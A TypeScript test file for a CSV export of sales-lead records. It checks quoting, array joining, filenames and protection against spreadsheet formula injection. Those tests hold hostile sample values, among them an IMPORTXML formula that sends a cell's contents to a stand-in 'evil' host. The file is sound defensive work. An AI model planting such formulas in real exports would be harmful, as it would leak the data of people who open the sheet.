/**
 * Tests for the lead-record CSV export (MES-198 / T7 D-B). Run: `npm test`.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { csvEscape, recordsToCsv, csvFilename } from './leadCsv.ts';
import type { LeadDatabaseRecord } from '@/types/leadDatabase';

const rec = (o: Partial<LeadDatabaseRecord>): LeadDatabaseRecord => ({
  id: 'r1', lead_database_id: 'd1', company_name: null, contact_name: null, job_title: null,
  company_description: null, sector: null, location: null, city: null, state: null, country: 'AU',
  linkedin_url: null, website_url: null, email: null, phone: null, revenue_range: null,
  employee_count_range: null, founded_year: null, buying_signals: null, technologies_used: null,
  notes: null, is_preview: false, created_at: '2026-07-16', ...o,
});

test('csvEscape quotes fields with commas, quotes, newlines; joins arrays; blanks nullish', () => {
  assert.equal(csvEscape('plain'), 'plain');
  assert.equal(csvEscape('a,b'), '"a,b"');
  assert.equal(csvEscape('she said "hi"'), '"she said ""hi"""');
  assert.equal(csvEscape('line1\nline2'), '"line1\nline2"');
  assert.equal(csvEscape(['saas', 'b2b']), 'saas; b2b');
  assert.equal(csvEscape(null), '');
  assert.equal(csvEscape(undefined), '');
  assert.equal(csvEscape(2019), '2019');
});

test('recordsToCsv emits a header + one CRLF-delimited row per record', () => {
  const csv = recordsToCsv([
    rec({ company_name: 'Acme, Inc', contact_name: 'Aoife', email: 'a@acme.com', buying_signals: ['hiring', 'funding'] }),
  ]);
  const lines = csv.split('\r\n');
  assert.equal(lines.length, 2);
  assert.match(lines[0], /^Company,Contact,Job title,Email,/);
  // company with a comma is quoted; array joined with '; '
  assert.ok(lines[1].includes('"Acme, Inc"'));
  assert.ok(lines[1].includes('a@acme.com'));
  assert.ok(lines[1].includes('hiring; funding'));
});

test('csvEscape neutralises spreadsheet formula injection (leading = + - @)', () => {
  // A leading formula char gets a single-quote prefix so Excel/Sheets treats it
  // as text; embedded commas/quotes still trigger RFC-4180 wrapping.
  assert.equal(csvEscape('=HYPERLINK("http://evil","x")'), '"\'=HYPERLINK(""http://evil"",""x"")"');
  assert.equal(csvEscape('+1-800-EVIL'), "'+1-800-EVIL");
  assert.equal(csvEscape('-2+3'), "'-2+3");
  assert.equal(csvEscape('@SUM(A1)'), "'@SUM(A1)");
  assert.equal(csvEscape('\t=cmd'), "'\t=cmd");
  // benign values are untouched
  assert.equal(csvEscape('Acme Pty'), 'Acme Pty');
  assert.equal(csvEscape('a=b'), 'a=b'); // '=' not leading → safe
});

test('recordsToCsv formula-guards a malicious company_name field', () => {
  const csv = recordsToCsv([
    rec({ company_name: '=IMPORTXML(CONCAT("http://evil/?d=",A2),"//x")' }),
  ]);
  // the data cell is prefixed with ' inside its RFC-4180 quotes
  assert.match(csv.split('\r\n')[1], /^"'=IMPORTXML/);
});

test('recordsToCsv on an empty list is just the header', () => {
  const csv = recordsToCsv([]);
  assert.equal(csv.split('\r\n').length, 1);
  assert.match(csv, /^Company,/);
});

test('csvFilename slugifies the title and always ends in .csv', () => {
  assert.equal(csvFilename('SaaS Founders — Sydney'), 'saas-founders-sydney.csv');
  assert.equal(csvFilename(''), 'lead-list.csv');
  assert.equal(csvFilename(null), 'lead-list.csv');
  assert.equal(csvFilename('!!!'), 'lead-list.csv');
});
